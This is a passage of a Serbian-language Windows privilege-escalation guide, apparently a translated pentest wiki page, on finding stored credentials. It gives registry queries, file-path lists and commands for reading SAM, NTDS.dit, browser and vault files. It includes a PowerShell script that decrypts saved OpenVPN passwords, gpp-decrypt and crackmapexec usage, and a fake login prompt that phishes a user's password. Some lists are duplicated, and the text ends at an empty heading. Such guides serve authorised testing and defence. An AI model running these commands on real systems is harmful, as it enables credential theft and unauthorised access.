Konfiguracije Velociraptor servera, najčešće nazvane `server.config.yaml`, mogu sadržati `CA.private_key` internog CA-a. Ako korisnik sa nižim privilegijama može da čita taj ključ, možda može da izda API klijentski sertifikat. Da li to vodi do većih privilegija zavisi od korisničkih uloga na serveru, dostupnosti API-ja i identiteta pod kojim se izvršavaju server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; pronalazak takve konfiguracije ne potvrđuje pristup CA-u servera. Neka okruženja čuvaju privatni ključ CA-a van mreže, pa čitljiva konfiguracija servera možda nema ni ključ za potpisivanje.

Na Windows serveru pregledajte ACL konfiguracije **servera** u njegovom instalacionom direktorijumu i sve zaštićene rezervne kopije. Jedna od mogućih lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ako se razlikuje, koristite putanju konfigurisanu za uslugu. Potvrdite da trenutni identitet može da čita datoteku i da je `CA.private_key` zaista prisutan. Izbegavajte ispisivanje privatnog ključa u evidenciju ili izlaz enumeracije. Proizvođačev postupak `config api_client` koristi ključ CA-a za izdavanje klijentskog sertifikata, ali potrebna je i odgovarajuća uloga na serveru; njeno kreiranje ili menjanje može zahtevati upis u skladište podataka ili ponovno pokretanje. Postojeći privilegovani identitet na serveru može omogućiti pristup čak i kada ti upisi nisu mogući. API upiti sa pravima za izvršavanje pokreću se u odgovarajućem kontekstu servera ili agenta, koji može imati visoke privilegije.

Zaštitite konfiguraciju servera i rezervne kopije restriktivnim ACL-ovima, držite ključ za potpisivanje CA-a van mreže gde je moguće i ograničite API uloge i pristup listeneru. Pogledajte [Velociraptor API dokumentaciju](https://docs.velociraptor.app/docs/server_automation/server_api/) i [uputstva za bezbednosnu konfiguraciju](https://docs.velociraptor.app/docs/deployment/security/).

### Putty akreditivi

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban menadžer sesija. Njegovo izvorno šifrovano skladište može se nalaziti na `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može imati naziv `sessions-backup.dat` i biti sačuvana na drugoj lokaciji. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i da mogu sadržati sesije, ključeve, skripte, oznake i veze; njegov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) identifikuje izvorno skladište. Najpre proverite dozvole i putanje do datoteka. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### PuTTY SSH ključevi hostova

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, pa proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo koji unos unutar te putanje, verovatno je reč o sačuvanom SSH ključu. Čuva se šifrovan, ali se može lako dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako usluga `ssh-agent` nije pokrenuta, a želite da se automatski pokreće pri podizanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da napravim ssh ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu preko ssh-a. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije identifikovao upotrebu `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Datoteke za instalaciju bez nadzora

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete potražiti i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Rezervne kopije SAM-a i SYSTEM-a

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive Windows Imaging (`.wim`) datoteke rezervnih kopija mogu da sadrže i offline `SAM`, `SECURITY` i `SYSTEM` košnice registra. Prioritet dajte lokalno dostupnim direktorijumima sa rezervnim kopijama ili image datotekama i pre izdvajanja proverite **nazive članova** image datoteke; samo ime `.wim` datoteke ne dokazuje da su košnice izložene, a uobičajene `install.wim`, `boot.wim` i recovery image datoteke često su pogrešni tragovi. SMB share predstavlja zaseban put pristupa i treba ga proveravati samo ako je obuhvaćen opsegom. Pogledajte Microsoft-ova uputstva za [Windows image datoteke](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu o datotekama košnica registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud akreditivi

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je bila dostupna funkcija koja je omogućavala postavljanje prilagođenih lokalnih administratorskih naloga na grupi računara pomoću Group Policy Preferences (GPP). Međutim, ovaj metod je imao ozbiljne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svim korisnicima domena. Drugo, lozinke unutar ovih GPP-ova, šifrovane pomoću AES256 algoritma sa javno dokumentovanim podrazumevanim ključem, mogao je da dešifruje bilo koji autentifikovani korisnik. To je predstavljalo ozbiljan rizik jer je korisnicima moglo omogućiti da dobiju povišene privilegije.

Da bi se ovaj rizik ublažio, razvijena je funkcija koja pretražuje lokalno keširane GPP datoteke i traži polje „cpassword“ koje nije prazno. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što pomaže u identifikovanju i otklanjanju ove bezbednosne ranjivosti.

Potražite ove datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Za dešifrovanje cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec-a za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config fajla sa pristupnim podacima:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Rezervne arhive u IIS webroot-u

Stara ZIP rezervna kopija postavljena direktno u webroot koji se poslužuje može da otkrije prethodne konfiguracione datoteke i ponovo upotrebljive akreditive. Proverite konfigurisanu fizičku putanju sajta i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je kandidat. Brz lokalni popis može da prikaže nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ime arhive ne dokazuje da ona sadrži tajnu niti da pronađeni akreditiv omogućava viši nivo privilegija.

### OpenVPN akreditivi

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dnevnici

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite akreditive

Uvek možete **zatražiti od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako mislite da ih zna (imajte na umu da je **direktno traženje akreditiva** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koje sadrže pristupne podatke**

Poznate datoteke koje su nekada sadržale **lozinke** u **običnom tekstu** ili u formatu Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Varijanta sa listom imena datoteka bez ekstenzije za Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Baze podataka Password Safe v3 obično koriste ekstenziju `.psafe3`. Podudarno ime datoteke tretirajte kao mogući šifrovani trezor; samo njegovo prisustvo ne znači da možete da ga pročitate, otključate ili upotrebite sačuvane akreditive. Prilikom provere lokacija na kojima se takve datoteke čuvaju, proverite dostupne korisničke profile i konfigurisane korene deljenih datoteka.

Čitljiva KeePass `.kdbx` datoteka takođe je samo trag koji ukazuje na šifrovani trezor. Da biste je otključali, potrebni su stvarna glavna lozinka i sve konfigurisane datoteke ključeva ili faktori naloga. Ako ovlašćena provera pronađe par LM:NT heševa u unosu, proverite navedeni nalog i da li je NT heš aktuelan i prihvaćen na ciljnoj NTLM usluzi pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Unos u trezoru sam po sebi ne daje Administrator ili SYSTEM prava; moraju biti ispunjeni i uslovi za pristup udaljenoj usluzi, prava naloga i svaki zaseban korak za izvršavanje usluge. U inventaru navedite putanju do trezora i da li je čitljiv, a nemojte ispisivati bazu podataka ni sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Varijanta komande za pretragu bez proširenja Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Akreditivi u korpi za otpatke

Takođe proverite korpu za otpatke i potražite akreditive u njoj.

Proverite dostupne stavke u korpi za otpatke i potražite obrisane rezervne kopije i arhive konfiguracije, kao i datoteke čiji nazivi izričito pominju akreditive. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara mesecima i imati uobičajen naziv. Windows čuva originalnu putanju i vreme brisanja u `$I` zapisu, a obrisanu datoteku kao upareni `$R` unos; pregledajte metapodatke i proverite da li trenutni identitet ima dozvolu za čitanje pre nego što otvorite arhivu. Vidljivost zavisi od volumena, korisničkog SID-a i dozvola za datoteke, pa prazan spisak ne dokazuje da ne postoji nijedna obnovljiva rezervna kopija. Naziv arhive posmatrajte kao razlog za proveru, a ne kao dokaz da ona sadrži važeću tajnu.

Dostupna obrisana `.pfx` datoteka takođe može ukazivati na **potpisivanje koda**. Ako sadrži dostupan privatni ključ, tim ključem se može potpisati izmenjena PowerShell skripta; [PowerShell zahteva sertifikat za potpisivanje koda sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [pravila izdavača u AppLocker-u procenjuju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Izvršavanje između naloga zahteva da trenutni identitet može da izmeni baš tu skriptu, da važeće pravilo prihvata dobijeni potpis za skriptu i ciljni nalog, kao i da je zaista pokreće zakazani zadatak ili neki drugi proces sa višim privilegijama. Sam naziv `.pfx` datoteke, predmet sertifikata ili mogućnost pisanja u skriptu ne dokazuju da je ovaj lanac uspostavljen. Pre otvaranja materijala sa privatnim ključem ili pokretanja zadatka pregledajte metapodatke, ACL-ove, pravila i zakazanu komandu.

Takođe pregledajte dostupne baze profila klijenata za razmenu poruka, beleške i primljene datoteke i potražite tragove koji mogu ukazivati na akreditive. Izvezena BitLocker datoteka za oporavak može biti sačuvana kao HTML ili TXT, ponekad unutar arhive sa nazivom rezervne kopije. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu koji sadrži starije rezervne kopije; pregledajte volumen i arhivu samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, za oporavak akreditiva domena van mreže potrebna je i odgovarajuća `SYSTEM` košnica, kao što je opisano u [radnom toku za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sami nazivi datoteka i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Za **oporavak lozinki** sačuvanih u nekoliko programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Ostali mogući ključevi registra koji sadrže akreditive**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izdvajanje OpenSSH ključeva iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz **Chrome-a ili Firefox-a**.\
Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz **Chrome-a, Edge-a ili Firefox-a**.\
Proverite i istoriju, obeleživače i favorite pregledača jer se tamo možda čuvaju neke **lozinke**.

Za podrazumevani profil **Default** pregledača Edge trenutnog korisnika, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok se `Local State` nalazi u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); drugi profil ili smernica `UserDataDir` mogu da promene tu lokaciju. Samo postojanje datoteka ukazuje na mogući izvor akreditiva: proverite da li su datoteke čitljive, da li imate DPAPI kontekst odgovarajućeg korisnika ili drugi odobreni materijal ključa i da li sačuvana prijava pripada nalogu sa većim privilegijama. Samo nabrajanje putanja ne mora da otvori bazu podataka niti da ispiše dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu uparene datoteke za ključ i šifrovane prijave. Njihovo postojanje samo ukazuje na mogući izvor: proverite da li su obe datoteke čitljive, da li postoje sačuvani unosi i da li je ključ zaštićen primarnom lozinkom pre nego što zaključite da se akreditivi mogu koristiti. Ako pronađeni akreditiv pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za upravljanje grupama i prava grupe za [čitanje ili dešifrovanje LAPS lozinke](../active-directory-methodology/laps.md); artefakti pregledača sami po sebi ne potvrđuju put do administratorskih privilegija.

Alatke za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta **identifikuje se pomoću ID-a klase (CLSID)**, a svaka komponenta izlaže funkcionalnost preko jednog ili više interfejsa, identifikovanih ID-ovima interfejsa (IID).

COM klase i interfejsi definisani su u registru, pod ključevima **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**, tim redosledom. Ovaj registar nastaje spajanjem ključeva **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registra možete pronaći podključ registra **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL** i vrednost pod nazivom **ThreadingModel**, koja može biti **Apartment** (jednonitni), **Free** (višenitni), **Both** (jednonitni ili višenitni) ili **Neutral** (nezavisan od niti).

![Istorija pregledača - COM DLL Overwriting: Unutar CLSID-ova ovog registra možete pronaći podključ registra InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL i vrednost...](<../../images/image (729).png>)

U suštini, ako možete da **prepišete bilo koju DLL datoteku** koja će biti izvršena, mogli biste da **eskalirate privilegije** ako tu DLL datoteku izvršava drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za održavanje pristupa, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registru**

**Pretraga sadržaja datoteka**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Potražite datoteku sa određenim imenom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registar u potrazi za nazivima ključeva i lozinkama**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alati koji traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da bi **automatski izvršavao svaki metasploit POST modul koji traži kredencijale** na žrtvi.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve datoteke koje sadrže lozinke navedene na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sesije**, **korisnička imena** i **lozinke** za nekoliko alata koji čuvaju ove podatke u čistom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Curenje handle-ova

Zamislite da **proces koji radi kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali nasleđuje sve otvorene handle-ove glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete preuzeti **otvoreni handle do privilegovanog procesa kreiranog** pomoću `OpenProcess()` i **ubaciti shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte [**ovaj drugi tekst** za potpunije objašnjenje kako testirati i zloupotrebiti dodatne otvorene handle-ove procesa i niti nasleđene sa različitim nivoima dozvola (ne samo punim pristupom)](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonacija klijenta Named Pipe-a

Segmenti deljene memorije, koji se nazivaju **pipes**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo je slično klijent/server arhitekturi, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **klijent** pošalje podatke kroz pipe, **server** koji je podesio pipe može **preuzeti identitet** **klijenta**, pod uslovom da ima neophodna prava **SeImpersonate**. Pronalaženje **privilegovanog procesa** koji komunicira preko pipe-a koji možete imitirati pruža priliku da **dobijete veće privilegije** preuzimanjem identiteta tog procesa kada stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje ovakvog napada možete pronaći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava **presretanje komunikacije preko named pipe-a pomoću alata kao što je Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privesc-ova** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv: udaljeni DWORD upis do RCE

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani klijent može zloupotrebiti asinhronu putanju događaja zasnovanu na mailslot-u kako bi pretvorio `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju `NETWORK SERVICE` može da upisuje, a zatim dobio administratorska prava za Telephony i učitao proizvoljan DLL kao servis. Potpun tok:

- `ClientAttach` sa `pszDomainUser` postavljenim na postojeću putanju u koju je moguće upisivati → servis je otvara preko `CreateFileW(..., OPEN_EXISTING)` i koristi je za asinhroni upis događaja.
- Svaki događaj upisuje napadačev `InitContext` iz `Initialize` u taj handle. Registrujte line app pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite događaje pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim odjavite registraciju/isključite servis da biste ponovili determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa proizvoljnom putanjom DLL-a kako biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu da izvršavaju sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute-a preko Markdown renderer-a

